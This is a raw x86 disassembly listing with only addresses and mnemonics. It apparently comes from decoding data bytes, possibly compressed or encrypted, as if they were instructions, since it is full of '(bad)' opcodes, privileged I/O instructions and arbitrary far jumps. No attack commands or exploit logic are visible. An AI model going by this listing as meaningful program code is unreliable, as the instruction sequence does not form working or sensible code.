  41fae0:	xchg   BYTE PTR [ebp-0x6f],al
  41fae3:	mov    edi,0x1439f5ce
  41fae8:	cmp    al,0x2d
  41faea:	mov    esi,0x23f77205
  41faef:	in     eax,0x1d
  41faf1:	inc    esi
  41faf2:	or     BYTE PTR [eax+0x467ef0bd],bh
  41faf8:	hlt    
  41faf9:	push   edx
  41fafa:	(bad)  
  41fafb:	sub    BYTE PTR [edi-0x239f7398],dl
  41fb01:	shl    ch,0xb9
  41fb04:	aaa    
  41fb05:	pusha  
  41fb06:	xchg   ebp,eax
  41fb07:	ret    0x60bf
  41fb0a:	mov    BYTE PTR [esi+ebx*4+0x629162e0],cl
  41fb11:	cld    
  41fb12:	inc    esi
  41fb13:	(bad)  [esi+ecx*8]
  41fb16:	pop    ebx
  41fb17:	cmp    BYTE PTR [ebx+0x1e83b6b0],ah
  41fb1d:	pop    es
  41fb1e:	cmp    BYTE PTR [eax],dl
  41fb20:	mov    WORD PTR [ecx],?
  41fb22:	push   0xe9e946
  41fb27:	mov    al,ds:0x4ee23e3a
  41fb2c:	jle    0x41fb30
  41fb2e:	out    0x9,al
  41fb30:	xor    cl,BYTE PTR [esi]
  41fb32:	xor    BYTE PTR ds:0xb7f9903e,ah
  41fb38:	popa   
  41fb39:	or     ecx,eax
  41fb3b:	jo     0x41fb81
  41fb3d:	repnz inc ebx
  41fb3f:	fisubr DWORD PTR [eax+0x2a]
  41fb42:	ja     0x41face
  41fb44:	or     al,0x86
  41fb46:	push   ss
  41fb47:	in     eax,0x19
  41fb49:	sti    
  41fb4a:	lock or edx,esp
  41fb4d:	fild   DWORD PTR [edx-0x3a]
  41fb50:	retf   0xc066
  41fb53:	mov    WORD PTR [ecx],?
  41fb55:	clc    
  41fb56:	mov    edi,0xea1480ec
  41fb5b:	add    BYTE PTR [ecx-0x7ab2d3fd],al
  41fb61:	sbb    BYTE PTR [ebx],0xee
  41fb64:	push   ss
  41fb65:	std    
  41fb66:	push   edi
  41fb67:	pushf  
  41fb68:	mov    bl,0xb2
  41fb6a:	xchg   esp,eax
  41fb6b:	outs   dx,DWORD PTR ds:[esi]
  41fb6c:	rcl    DWORD PTR [ecx-0x34aa3009],1
  41fb72:	push   ss
  41fb73:	fisubr DWORD PTR [ecx]
  41fb75:	mov    eax,0xed79523a
  41fb7a:	jmp    0x43bf:0x95a5618a
  41fb81:	push   eax
  41fb82:	xlat   BYTE PTR ds:[ebx]
  41fb83:	mov    dl,0xc6
  41fb85:	(bad)  
  41fb86:	fcmovnb st,st(1)
  41fb88:	stos   DWORD PTR es:[edi],eax
  41fb89:	jge    0x41fb5d
  41fb8b:	jb     0x41fbd8
  41fb8d:	leave  
  41fb8e:	ss mov bl,0xe2
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	hlt    
  41fc01:	jnp    0x41fba3
  41fc03:	ds push edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0xc3000001
  41fc0d:	inc    ecx
  41fc0e:	jno    0x41fc2d
  41fc10:	addr16 jmp 0x866bd6b5
  41fc16:	cs fcom st(1)
  41fc19:	ret    0x42c7
  41fc1c:	int3   
  41fc1d:	xlat   BYTE PTR ds:[ebx]
  41fc1e:	mul    cl
  41fc20:	push   0x9
  41fc22:	mov    dh,0xe7
  41fc24:	jmp    0xc063:0xbda8cb21
  41fc2b:	xor    bh,BYTE PTR [esi-0x20]
  41fc2e:	adc    ch,BYTE PTR [edi+0x6f]
  41fc31:	dec    ecx
  41fc32:	pop    eax
  41fc33:	dec    esi
  41fc34:	push   cs
  41fc35:	lds    eax,FWORD PTR [edx]
  41fc37:	in     al,0x63
  41fc39:	jp     0x41fc2b
  41fc3b:	int3   
  41fc3c:	addr16 cld 
  41fc3e:	cmp    al,0xee
  41fc40:	jb     0x41fc4e
  41fc42:	push   es
  41fc43:	jae    0x41fc89
  41fc45:	lock adc ebx,DWORD PTR [eax-0x7e]
  41fc49:	xor    dh,BYTE PTR [eax-0x35]
  41fc4c:	pop    edi
  41fc4d:	pop    ecx
  41fc4e:	add    ecx,DWORD PTR [eax+0x22]
  41fc51:	(bad)  
  41fc52:	call   0xa29ce286
  41fc57:	gs xor BYTE PTR cs:[ecx-0xc],ch
  41fc5c:	xchg   ebp,eax
  41fc5d:	(bad)  
  41fc5e:	mov    ds:0x60d0bf7f,eax
  41fc63:	adc    al,al
  41fc65:	es adc eax,0x7b490e70
  41fc6b:	ret    
  41fc6c:	push   eax
  41fc6d:	cmp    BYTE PTR [edi-0x37cc38ae],0xa0
  41fc74:	mov    al,0xf1
  41fc76:	inc    eax
  41fc77:	jnp    0x41fcdf
  41fc79:	xchg   BYTE PTR [edi-0x19],dl
  41fc7c:	or     eax,0x67e3b913
  41fc81:	jmp    0xd2e6fee1
  41fc86:	mov    esp,0x8a85b81
  41fc8b:	and    al,0x98
  41fc8d:	dec    edi
  41fc8e:	jns    0x41fcf6
  41fc90:	lahf   
  41fc91:	pop    edx
  41fc92:	ret    0x97bb
  41fc95:	inc    esi
  41fc96:	mov    ebx,0xb96ec3dd
  41fc9b:	xlat   BYTE PTR ds:[ebx]
  41fc9c:	push   ebp
  41fc9d:	pop    edx
  41fc9e:	sbb    edx,DWORD PTR [edi-0x49]
  41fca1:	ins    DWORD PTR es:[edi],dx
  41fca2:	imul   edx,DWORD PTR ds:0xe6e94f57,0x443f5e03
  41fcac:	js     0x41fd11
  41fcae:	mov    WORD PTR [edi+0x3e3a233f],gs
  41fcb4:	xchg   ch,ah
  41fcb6:	ret    0x6dbe
  41fcb9:	mov    ebp,DWORD PTR [ebx+0x2a]
  41fcbc:	enter  0x9b34,0xc6
  41fcc0:	sub    dl,BYTE PTR [edi-0x56b631dc]
  41fcc6:	inc    ebx
  41fcc7:	mov    esp,0xd12d56a5
  41fccc:	rcl    edx,0xb0
  41fccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcd0:	push   ebx
  41fcd1:	bound  ecx,QWORD PTR [ecx-0x3c]
  41fcd4:	bound  esp,QWORD PTR [edx-0x1555e4d5]
  41fcda:	cmp    al,0xb2
  41fcdc:	jmp    0x41fd2e
  41fcde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcdf:	inc    eax
  41fce0:	pop    eax
  41fce1:	dec    edi
  41fce2:	fmul   DWORD PTR [eax-0x7e6301dd]
  41fce8:	xchg   esp,eax
  41fce9:	dec    esp
  41fcea:	gs jae 0x41fd6c
  41fced:	add    eax,0xb5859d98
  41fcf2:	or     al,0xfd
  41fcf4:	outs   dx,BYTE PTR ds:[esi]
  41fcf5:	xor    bl,0xb3
  41fcf8:	fs inc ecx
  41fcfa:	rcl    dh,cl
  41fcfc:	iret   
  41fcfd:	and    ah,0x5c
  41fd00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd01:	add    eax,0x71b65acc
  41fd06:	xchg   esp,eax
  41fd07:	add    al,0xdb
  41fd09:	bound  edx,QWORD PTR [ecx]
  41fd0b:	xor    DWORD PTR [edx+0x54],ecx
  41fd0e:	mov    bh,0x8d
  41fd10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	jmp    0x57f2930b
  41fd85:	push   ebx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    eax,0xaa000001
  41fd8d:	test   al,0x82
  41fd8f:	data16 je 0x41fd7a
  41fd92:	rcr    BYTE PTR [ecx+0x75607a47],0x47
  41fd99:	lods   al,BYTE PTR ds:[esi]
  41fd9a:	mov    eax,ds:0x4cb1e9c8
  41fd9f:	pop    esi
  41fda0:	icebp  
  41fda1:	cs inc ebx
  41fda3:	in     al,0x78
  41fda5:	loope  0x41fda0
  41fda7:	xchg   ecx,eax
  41fda8:	ins    DWORD PTR es:[edi],dx
  41fda9:	js     0x41fe26
  41fdab:	dec    esi
  41fdac:	or     DWORD PTR [eax],esi
  41fdae:	xor    al,0xf1
  41fdb0:	scas   al,BYTE PTR es:[edi]
  41fdb1:	fidivr WORD PTR [edi-0x79c1bacb]
  41fdb7:	pop    edi
  41fdb8:	retf   
  41fdb9:	add    bl,BYTE PTR [esp+ebp*4+0x2daa9ba0]
  41fdc0:	sbb    ebp,DWORD PTR [ebx]
  41fdc2:	retf   0xfb72
  41fdc5:	cmp    ch,BYTE PTR [edi]
  41fdc7:	sbb    al,0x9d
  41fdc9:	xchg   esp,eax
  41fdca:	stos   BYTE PTR es:[edi],al
  41fdcb:	sbb    eax,0x79a9118b
  41fdd0:	std    
  41fdd1:	out    0xd7,al
  41fdd3:	rol    bh,1
  41fdd5:	leave  
  41fdd6:	cmp    BYTE PTR [ebp+ebx*2+0x78],0x49
  41fddb:	fcmovnbe st,st(7)
  41fddd:	test   esp,esi
  41fddf:	cmp    al,0x80
  41fde1:	mov    dl,0x6c
  41fde3:	ins    BYTE PTR es:[edi],dx
  41fde4:	xor    eax,0x6ece28d
  41fde9:	loope  0x41fe58
  41fdeb:	pop    ecx
  41fdec:	mov    edx,0xb7ba0967
  41fdf1:	bound  ecx,QWORD PTR fs:[ebp+0x5b3eea8f]
  41fdf8:	or     DWORD PTR [edx-0x600fd9b2],0xffffffa3
  41fdff:	test   al,0x36
  41fe01:	lods   al,BYTE PTR ds:[esi]
  41fe02:	mov    ebp,0x20453e58
  41fe07:	ins    BYTE PTR es:[edi],dx
  41fe08:	mov    al,ds:0xff098dca
  41fe0d:	mov    ch,0xa5
  41fe0f:	out    0x2e,al
  41fe11:	addr16 (bad) 
  41fe13:	mov    esp,0x7fb406d4
  41fe18:	into   
  41fe19:	fnsave [edi]
  41fe1b:	call   0x3fa6e49a
  41fe20:	xor    eax,DWORD PTR [esp+edi*4]
  41fe23:	xor    eax,0xc9e37de8
  41fe28:	pop    ds
  41fe29:	and    al,BYTE PTR [esi-0x20c007c0]
  41fe2f:	push   edx
  41fe30:	cmp    ch,ah
  41fe32:	push   ecx
  41fe33:	or     al,dh
  41fe35:	jbe    0x41fea7
  41fe37:	xchg   edi,eax
  41fe38:	push   ecx
  41fe39:	outs   dx,DWORD PTR ds:[esi]
  41fe3a:	mov    ebp,0x7304e0c6
  41fe3f:	push   ebp
  41fe40:	cmp    al,0xc4
  41fe42:	clc    
  41fe43:	xchg   BYTE PTR [eax],dh
  41fe45:	das    
  41fe46:	fcomp  DWORD PTR [edx+edx*8+0x2f]
  41fe4a:	add    eax,0x992cb3d6
  41fe4f:	jo     0x41fe03
  41fe51:	ja     0x41fe5b
  41fe53:	pop    ds
  41fe54:	out    dx,eax
  41fe55:	clc    
  41fe56:	jb     0x41feae
  41fe58:	push   es
  41fe59:	push   cs
  41fe5a:	cmp    eax,0x6a8eca67
  41fe5f:	repz mov al,ds:0x61d9a054
  41fe65:	push   ebp
  41fe66:	fdiv   QWORD PTR [ebx+0x27]
  41fe69:	xor    eax,0xe1685dc7
  41fe6e:	dec    eax
  41fe6f:	cmp    bl,BYTE PTR [edx+0x28c1f725]
  41fe75:	(bad)  
  41fe76:	fistp  QWORD PTR [ecx+0x3]
  41fe79:	bound  esi,QWORD PTR [ecx+0x60]
  41fe7c:	adc    bl,BYTE PTR [esi]
  41fe7e:	lds    esp,FWORD PTR [ebx+0x11aa9681]
  41fe84:	es pop esi
  41fe86:	cmp    BYTE PTR [eax+0x32],al
  41fe89:	sbb    bl,bh
  41fe8b:	mov    ds:0x6350abc7,al
  41fe90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  41fef1:	add    BYTE PTR [eax],al
  41fef3:	add    BYTE PTR [edx-0x1865ab],ch
  41fef9:	out    dx,eax
  41fefa:	call   FWORD PTR [ebp-0x5]
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x6b
  41ff01:	jle    0x41ff3a
  41ff03:	push   ss
  41ff04:	pop    esp
  41ff05:	push   esp
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    eax,0x36000001
  41ff0d:	loopne 0x41ff3d
  41ff0f:	xchg   ebp,eax
  41ff10:	arpl   cx,dx
  41ff12:	test   DWORD PTR ds:0x752548ab,ebp
  41ff18:	std    
  41ff19:	sbb    al,0x4d
  41ff1b:	sbb    DWORD PTR [esi-0x27],ebp
  41ff1e:	out    0xd8,al
  41ff20:	mov    ebp,0x445a0c99
  41ff25:	adc    eax,0x8b2075aa
  41ff2a:	loope  0x41ff77
  41ff2c:	jg     0x41fee0
  41ff2e:	jmp    0x41ff01
  41ff30:	ds dec esi
  41ff32:	ins    DWORD PTR es:[edi],dx
  41ff33:	adc    BYTE PTR ds:0xde16a70c,bl
  41ff39:	add    dl,BYTE PTR [edi]
  41ff3b:	inc    esi
  41ff3c:	pushf  
  41ff3d:	retf   
  41ff3e:	push   ds
  41ff3f:	mov    DWORD PTR [esi],0x85b3f325
  41ff45:	(bad)
  41ff48:	jns    0x41ff7e
  41ff4a:	mov    esi,esp
  41ff4c:	clc    
  41ff4d:	cs stos DWORD PTR es:[edi],eax
  41ff4f:	sub    BYTE PTR [eax],dh
  41ff51:	dec    esi
  41ff52:	stos   BYTE PTR es:[edi],al
  41ff53:	div    esi
  41ff55:	xchg   ecx,eax
  41ff56:	jae    0x41ffcb
  41ff58:	in     eax,0xeb
  41ff5a:	retf   0x6c4b
  41ff5d:	adc    ebx,edx
  41ff5f:	push   ds
  41ff60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff61:	les    ecx,FWORD PTR [edx+0x3c]
  41ff64:	inc    edi
  41ff65:	aam    0xd8
  41ff67:	xchg   ecx,eax
  41ff68:	sbb    eax,0xf419b250
  41ff6d:	cmc    
  41ff6e:	out    dx,al
  41ff6f:	in     eax,dx
  41ff70:	jmp    0x7c562368
  41ff75:	mov    eax,0xe4dd7ce0
  41ff7a:	rol    BYTE PTR ds:0xef6235bd,cl
  41ff80:	mov    bh,0xbe
  41ff82:	int3   
  41ff83:	cmp    DWORD PTR [ebp+eiz*8+0x45],0x51
  41ff88:	dec    edx
  41ff89:	cs cmp dl,ah
  41ff8c:	cwde   
  41ff8d:	mov    edi,0xd26d59ae
  41ff92:	loopne 0x41ffe4
  41ff94:	aaa    
  41ff95:	lock imul eax,DWORD PTR es:[ebx],0x3c
  41ff9a:	fsub   DWORD PTR [esi+edi*8+0x7a]
  41ff9e:	ret    
  41ff9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffa0:	cmp    DWORD PTR [ecx],0x256860fe
  41ffa6:	push   ecx
  41ffa7:	shl    DWORD PTR [esi+0x68],0x72
  41ffab:	push   esp
  41ffac:	loopne 0x41ff69
  41ffae:	cmp    al,0xf4
  41ffb0:	mov    gs,WORD PTR [ecx+0x45]
  41ffb3:	sub    BYTE PTR [edi-0x80],dh
  41ffb6:	xchg   ebp,eax
  41ffb7:	(bad)  
  41ffb8:	repnz mov ebp,0x1276340d
  41ffbe:	lods   al,BYTE PTR ds:[esi]
  41ffbf:	mov    ecx,0x77c1b2ac
  41ffc4:	xor    al,0x35
  41ffc6:	jmp    0x7f67:0x42ab095a
  41ffcd:	mov    DWORD PTR [eax+0x4afd82d7],ebp
  41ffd3:	loop   0x41ff8e
  41ffd5:	mov    ds:0x1c0b6c2c,eax
  41ffda:	sbb    bh,BYTE PTR [ecx-0x7b1fb821]
  41ffe0:	pop    ecx
  41ffe1:	(bad)  
  41ffe2:	stc    
  41ffe3:	out    dx,al
  41ffe4:	push   edx
  41ffe5:	(bad)  
  41ffe6:	shr    DWORD PTR [edx+ecx*1-0x2a96a963],1
  41ffed:	or     ah,BYTE PTR [ebx-0x43309f5d]
  41fff3:	mov    ebp,0x320b3f
  41fff8:	inc    ecx
  41fff9:	arpl   WORD PTR [ebp-0x48],bx
  41fffc:	int    0xeb
  41fffe:	pop    edi
  41ffff:	sar    DWORD PTR [eax],cl
  420001:	bound  ebx,QWORD PTR [ebx]
  420003:	retf   
  420004:	shl    ebp,0x91
  420007:	or     DWORD PTR [edi+esi*8-0x33a0a482],ebx
  42000e:	(bad)  
  42000f:	aam    0x76
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x3d
  420081:	test   al,0xc2
  420083:	aad    0x61
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0x59000001
  42008d:	xor    eax,0xf9800c34
  420092:	mov    gs,WORD PTR [edi-0x47306329]
  420098:	xchg   ecx,eax
  420099:	inc    eax
  42009a:	adc    BYTE PTR [eax],bh
  42009c:	mov    al,ds:0x207e1bc8
  4200a1:	out    dx,al
  4200a2:	jno    0x4200d4
  4200a4:	mov    bh,0xb
  4200a6:	cdq    
  4200a7:	xchg   edi,eax
  4200a8:	xlat   BYTE PTR ds:[ebx]
  4200a9:	cmc    
  4200aa:	sbb    BYTE PTR fs:[ecx-0x5492fc88],dl
  4200b1:	pop    edx
  4200b2:	stos   BYTE PTR es:[edi],al
  4200b3:	inc    esp
  4200b4:	cmp    ebx,DWORD PTR [edi+0x3fccec0c]
  4200ba:	hlt    
  4200bb:	wrmsr  
  4200bd:	dec    esi
  4200be:	fdivr  st,st(4)
  4200c0:	std    
  4200c1:	cmp    ah,BYTE PTR [ecx]
  4200c3:	icebp  
  4200c4:	fbstp  TBYTE PTR [ecx]
  4200c6:	int3   
  4200c7:	ret    0x7588
  4200ca:	shr    dh,0xd3
  4200cd:	mov    dl,BYTE PTR [ebx]
  4200cf:	mov    ecx,0x14d08485
  4200d4:	int    0x9c
  4200d6:	xor    eax,0xca7cfe36
  4200db:	out    0x69,eax
  4200dd:	inc    ecx
  4200de:	and    dl,dl
  4200e0:	and    cl,dh
  4200e2:	outs   dx,DWORD PTR ds:[esi]
  4200e3:	stos   DWORD PTR es:[edi],eax
  4200e4:	jne    0x4200a5
  4200e6:	jg     0x420134
  4200e8:	push   edi
  4200e9:	xor    eax,0xec23dc8c
  4200ee:	aas    
  4200ef:	pop    es
  4200f0:	lock call 0xf9e277bb
  4200f6:	lock xor al,BYTE PTR [edi-0x3c54e36e]
  4200fd:	adc    eax,0x1ae8210d
  420102:	scas   al,BYTE PTR es:[edi]
  420103:	fdiv   QWORD PTR [ebx+0x18]
  420106:	pop    ds
  420107:	add    al,0x61
  420109:	and    eax,0xc7085174
  42010e:	ror    BYTE PTR [esi+0x6c1bd29e],0x3e
  420115:	mov    esp,DWORD PTR [edx+0x4a]
  420118:	jge    0x4200dd
  42011a:	ins    BYTE PTR es:[edi],dx
  42011b:	push   edi
  42011c:	push   esp
  42011d:	test   DWORD PTR [ecx],0xc35a1282
  420123:	loop   0x4200f8
  420125:	sahf   
  420126:	fadd   QWORD PTR [ebp-0x69]
  420129:	push   ebx
  42012a:	out    dx,al
  42012b:	loop   0x42010b
  42012d:	sub    eax,0xba14d664
  420132:	enter  0x723c,0xe6
  420136:	lahf   
  420137:	call   0x8446bac3
  42013c:	xor    DWORD PTR [ebx-0x7c],esi
  42013f:	push   edx
  420140:	sbb    eax,0x940aa75a
  420145:	popf   
  420146:	mov    al,ds:0xd51773f1
  42014b:	in     eax,0x32
  42014d:	xchg   edx,eax
  42014e:	or     esi,DWORD PTR [ecx]
  420150:	sub    edx,DWORD PTR [eax+0x7a]
  420153:	lock xor dh,ch
  420156:	popa   
  420157:	and    al,0x70
  420159:	mov    ah,BYTE PTR [ecx+0x70]
  42015c:	cmc    
  42015d:	xor    ecx,DWORD PTR [ebx-0x34]
  420160:	adc    edi,DWORD PTR [ecx-0x7f5ce57d]
  420166:	add    eax,0x85912da4
  42016b:	dec    eax
  42016c:	shl    DWORD PTR [ebx-0x3fb572d7],0x44
  420173:	jecxz  0x4201a9
  420175:	gs mov eax,0xdb2ce1c0
  42017b:	ja     0x4201be
  42017d:	test   eax,0x6c9bce94
  420182:	push   ebp
  420183:	cmp    eax,0xdc64e4be
  420188:	out    dx,eax
  420189:	push   ebx
  42018a:	loope  0x4201fb
  42018c:	or     ah,BYTE PTR [ebp+0x5]
  42018f:	mov    ebp,DWORD PTR [esi]
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x23bdb6b],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0xd6000001
  42020d:	jne    0x4201ff
  42020f:	xor    al,0x34
  420211:	inc    edx
  420212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420213:	fistp  QWORD PTR [eax+ebx*2+0x4a]
  420217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420218:	outs   dx,BYTE PTR ds:[esi]
  420219:	jo     0x420241
  42021b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42021c:	adc    DWORD PTR [edx],esi
  42021e:	mov    dl,0x71
  420220:	or     DWORD PTR [eax-0x4b],edx
  420223:	in     al,dx
  420224:	push   ebp
  420225:	inc    ecx
  420226:	push   ebx
  420227:	pop    ebx
  420228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420229:	push   0xffffffc9
  42022b:	fwait
  42022c:	adc    DWORD PTR [eax],eax
  42022e:	pop    ds
  42022f:	lods   al,BYTE PTR ds:[esi]
  420230:	ja     0x420295
  420232:	mov    ch,0xe1
  420234:	jg     0x4201c8
  420236:	imul   ecx,DWORD PTR [ecx],0xffffffbf
  420239:	ror    BYTE PTR ds:0x236457f2,1
  42023f:	shl    BYTE PTR [edi+0x5f800700],cl
  420245:	sub    DWORD PTR [ecx+0x12bdafc6],ebx
  42024b:	shr    BYTE PTR [esi+0x5d01aa1a],0xe2
  420252:	adc    DWORD PTR [esi+esi*1+0x2f],esi
  420256:	or     eax,0x57d6bf10
  42025b:	dec    edi
  42025c:	cld    
  42025d:	sbb    DWORD PTR [ecx+eiz*8+0x26],ecx
  420261:	(bad)  
  420262:	fsubrp st(7),st
  420264:	fisubr WORD PTR [ebp-0x56aaaae0]
  42026a:	and    BYTE PTR [ecx-0x42],0x7a
  42026e:	(bad)  
  42026f:	rcr    esi,1
  420271:	lods   eax,DWORD PTR ds:[esi]
  420272:	pop    eax
  420273:	pop    esi
  420274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420275:	sub    ebp,ebp
  420277:	xor    al,0x8b
  420279:	aas    
  42027a:	jle    0x42021a
  42027c:	stos   BYTE PTR es:[edi],al
  42027d:	in     eax,0xcc
  42027f:	jnp    0x4202db
  420281:	mov    ebx,0xed115b67
  420286:	sti    
  420287:	jle    0x420267
  420289:	dec    eax
  42028a:	sbb    al,0x39
  42028c:	adc    edx,DWORD PTR [ecx]
  42028e:	adc    BYTE PTR [eax-0x7531d17b],cl
  420294:	add    dh,BYTE PTR [esi+edx*1-0x41a1ee42]
  42029b:	stc    
  42029c:	fistp  QWORD PTR [edi+0x3530d84a]
  4202a2:	dec    edi
  4202a3:	jo     0x42029c
  4202a5:	loope  0x42026a
  4202a7:	push   ebx
  4202a8:	clc    
  4202a9:	in     al,0x90
  4202ab:	sbb    eax,0x59901358
  4202b0:	or     al,0x42
  4202b2:	cld    
  4202b3:	sbb    ebp,esi
  4202b5:	les    edi,FWORD PTR [esi]
  4202b7:	nop
  4202b8:	loopne 0x42023e
  4202ba:	or     DWORD PTR [eax],esi
  4202bc:	mul    BYTE PTR [eax+0x49]
  4202bf:	and    esi,eax
  4202c1:	(bad)  
  4202c2:	into   
  4202c3:	sub    DWORD PTR [ebx+0x61da2698],ecx
  4202c9:	cmp    ecx,edx
  4202cb:	fs retf 0x8580
  4202cf:	add    bh,BYTE PTR [ebp-0x2d]
  4202d2:	loopne 0x4202f7
  4202d4:	mov    ebp,0x5bcc2d0e
  4202d9:	ror    DWORD PTR [ecx-0x31],0x8f
  4202dd:	adc    al,0x17
  4202df:	push   esp
  4202e0:	fs and eax,0xffffff92
  4202e4:	imul   ecx,DWORD PTR [esi+0x39],0x5303399e
  4202eb:	push   esi
  4202ec:	call   0x40f3028e
  4202f1:	std    
  4202f2:	sahf   
  4202f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202f4:	sub    BYTE PTR [edi-0x68a269ff],0xcc
  4202fb:	(bad)  
  4202fc:	gs hlt 
  4202fe:	sub    ecx,DWORD PTR [ecx]
  420300:	dec    ebp
  420301:	xor    ecx,DWORD PTR [esi]
  420303:	adc    BYTE PTR [esi+0xf],dh
  420306:	mov    esi,0x50768068
  42030b:	jnp    0x42034f
  42030d:	push   ecx
  42030e:	xchg   edx,eax
  42030f:	dec    esi
  420310:	pop    es
	...
  420371:	add    BYTE PTR [eax],al
  420373:	add    BYTE PTR [ecx+0x6],al
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	jno    0x420349
  420382:	(bad)  
  420383:	test   eax,0x1576b
  420388:	add    eax,0x42000001
  42038d:	outs   dx,DWORD PTR ds:[esi]
  42038e:	pop    ds
  42038f:	popf   
  420390:	popf   
  420391:	mov    bh,0xe6
  420393:	xor    bh,ch
  420395:	dec    edx
  420396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420397:	sub    DWORD PTR [ecx+0x4],0x67
  42039b:	pop    esp
  42039c:	ja     0x420395
  42039e:	sti    
  42039f:	into   
  4203a0:	mov    BYTE PTR [eax+eiz*1],dl
  4203a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203a4:	(bad)  
  4203a5:	rcr    ah,cl
  4203a7:	or     DWORD PTR [eax-0x2ed46b],esp
  4203ad:	dec    ebp
  4203ae:	xchg   ebx,eax
  4203af:	dec    esp
  4203b0:	mov    ebx,0x2b9b683
  4203b5:	je     0x4203e2
  4203b7:	test   eax,0xa4e8ca90
  4203bc:	aam    0x64
  4203be:	adc    BYTE PTR [ecx+0xa94f403],bl
  4203c4:	mov    ds:0x4c03171e,al
  4203c9:	js     0x42039e
  4203cb:	aaa    
  4203cc:	ror    BYTE PTR [ebp+edx*1-0x5],1
  4203d0:	sub    edx,DWORD PTR [edi-0x63f8af58]
  4203d6:	mov    edi,0xa532cb1c
  4203db:	nop
  4203dc:	cmc    
  4203dd:	mov    bh,0xe4
  4203df:	xchg   ebx,eax
  4203e0:	cwde   
  4203e1:	jnp    0x42044b
  4203e3:	adc    edx,DWORD PTR [eax-0x2347affd]
  4203e9:	test   ch,dl
  4203eb:	xchg   ebp,eax
  4203ec:	mov    ah,dh
  4203ee:	ret    
  4203ef:	aad    0x13
  4203f1:	mov    ah,0x77
  4203f3:	stos   DWORD PTR es:[edi],eax
  4203f4:	test   BYTE PTR [eax+edx*2-0x40],bh
  4203f8:	pop    ds
  4203f9:	int3   
  4203fa:	ss (bad) 
  4203fc:	xchg   ecx,eax
  4203fd:	adc    cl,ch
  4203ff:	(bad)  
  420400:	fbstp  TBYTE PTR [ecx+eiz*4]
  420403:	ins    DWORD PTR es:[edi],dx
  420404:	nop
  420405:	cwde   
  420406:	test   BYTE PTR [ecx-0x7bf51027],ah
  42040c:	cli    
  42040d:	adc    al,0xf0
  42040f:	es mov al,0x7f
  420412:	adc    DWORD PTR [esi],edi
  420414:	nop
  420415:	or     eax,0x4704c08d
  42041a:	inc    edi
  42041b:	dec    eax
  42041c:	mov    ch,0x7f
  42041e:	adc    BYTE PTR [edi-0x15],0x75
  420422:	pushf  
  420423:	gs mov bl,0x20
  420426:	sahf   
  420427:	cmc    
  420428:	and    esi,DWORD PTR [esi+ecx*8]
  42042b:	push   edx
  42042c:	dec    edi
  42042d:	sti    
  42042e:	cmp    ch,BYTE PTR [edx+0x4cd92abc]
  420434:	enter  0x3dab,0x91
  420438:	mov    BYTE PTR [edi],bh
  42043a:	in     al,dx
  42043b:	or     BYTE PTR [ebp+0x58e245a9],dh
  420441:	mov    ds:0xed911ba4,al
  420446:	mov    eax,0xb1f8daa3
  42044b:	mov    bl,0x3f
  42044d:	clc    
  42044e:	sahf   
  42044f:	cmp    eax,0x7dcc6f4b
  420454:	or     al,0xc7
  420456:	add    al,0xe0
  420458:	xchg   ebp,eax
  420459:	xor    eax,0x53eb1d7e
  42045e:	in     eax,0x25
  420460:	xor    BYTE PTR [edi+0x2e2f7ce1],dl
  420466:	(bad)  
  420467:	es xchg edx,eax
  420469:	imul   eax,edi,0xffffff8d
  42046c:	and    eax,0xcd6356e9
  420471:	mov    dl,0xcd
  420473:	pop    es
  420474:	xchg   esp,eax
  420475:	jbe    0x420466
  420477:	aam    0x87
  420479:	test   DWORD PTR [edi-0x4c],edx
  42047c:	nop
  42047d:	int    0xe1
  42047f:	shl    BYTE PTR [esi],0x60
  420482:	sub    ah,BYTE PTR [edi]
  420484:	mov    ecx,0x4842f8fc
  420489:	je     0x420436
  42048b:	fisttp WORD PTR [edi]
  42048d:	stc    
  42048e:	dec    ebx
  42048f:	inc    eax
  420490:	or     BYTE PTR [eax],al
	...
  4204f2:	add    BYTE PTR [eax],al
